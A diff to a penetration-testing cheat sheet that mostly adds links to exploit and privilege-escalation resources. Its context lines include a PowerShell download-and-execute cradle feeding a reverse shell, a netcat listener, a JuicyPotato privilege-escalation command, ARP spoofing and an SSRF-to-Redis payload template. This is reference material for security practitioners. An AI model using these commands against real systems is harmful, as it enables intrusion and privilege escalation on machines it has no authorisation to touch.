@@ -1,4 +1,4 @@
-﻿[**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
+﻿[**High-Speed Pizza Delivery**](https://snovvcrash.github.io)
 
 [//]: # (# -- 5 spaces)
 [//]: # (## -- 4 spaces)
@@ -1050,7 +1050,7 @@ List deleted AD objects (AD recycle bin):
 
 ```
 PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
-PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * |ft
+PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * | ft -autosize -wrap
 ```
 
 
@@ -1100,7 +1100,7 @@ PS > Bypass-AMSI
 * [https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
 * [https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
 * [https://xakep.ru/2020/12/23/shikata-ga-nai/](https://xakep.ru/2020/12/23/shikata-ga-nai/)
-
+* [https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?gi=84db9a8c5c5f](https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?gi=84db9a8c5c5f)
 
 
 
@@ -2002,13 +2002,13 @@ $ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
 
 Deb dependencies (Ubuntu 18.04 LTS):
 
-* [https://libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
-* [https://libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
-* [https://libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
-* [https://pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
-* [https://libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
-* [https://libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
-* [https://libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
+* [libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
+* [libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
+* [libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
+* [libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
+* [libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
 
 
 
@@ -4615,6 +4615,7 @@ $ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp
 
 * [https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
 * [https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)
+* [https://github.com/MrTiz9/CVE-2020-0688](https://github.com/MrTiz9/CVE-2020-0688)
 
 ```
 Get ViewStateUserKey: Browser → F12 → Storage → ASP.NET_SessionId
@@ -4943,6 +4944,8 @@ $ python rdp2tcp.py add reverse 127.0.0.1 1080 127.0.0.1 9003
 
 ## SeImpersonatePrivilege
 
+* [https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)
+
 
 
 ### Potatoes
@@ -4985,6 +4988,18 @@ Cmd > echo cmd /c powershell -exec bypass -nop -c "IEX(New-Object Net.WebClient)
 $ sudo rlwrap nc -lvnp 443
 Cmd > .\j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
 ```
+
+
+
+### PrintSpoofer
+
+* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+
+
+
+### Restore Privilege
+
+* [https://itm4n.github.io/localservice-privileges/](https://itm4n.github.io/localservice-privileges/)
 
 
 
@@ -6983,7 +6998,7 @@ function handleResponse() {
 
 
 
-### SSRF → Redis → RCE
+### SSRF → Redis → RCE (CE/EE)
 
 **CVE-2018-19571, CVE-2018-19585**
 
@@ -6999,12 +7014,27 @@ git://127.0.0.1:6379/%0a<REDIS_COMMANDS>
 
 
 
-### Path Traversal + RCE
+### Path Traversal → RCE (CE/EE)
 
 **CVE-2020-10977**
 
 * [https://xakep.ru/2020/05/26/gitlab-exploit/](https://xakep.ru/2020/05/26/gitlab-exploit/)
 * [https://www.exploit-db.com/exploits/49076](https://www.exploit-db.com/exploits/49076)
+
+
+
+### Path Traversal → RCE (EE)
+
+**CVE-2019-19088**
+
+* [https://gitlab.com/gitlab-org/gitlab/-/issues/36029](https://gitlab.com/gitlab-org/gitlab/-/issues/36029)
+
+
+
+
+## Sharepoint
+
+* [https://www.crummie5.club/the-lone-sharepoint/](https://www.crummie5.club/the-lone-sharepoint/)
 
 
 
@@ -7565,6 +7595,17 @@ $ sudo ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 1 --inter
 
 
 # Windows
+
+
+
+
+## Processes
+
+Kill process from cmd:
+
+```
+Cmd > taskkill /f /im:calc.exe
+```
 
 
 
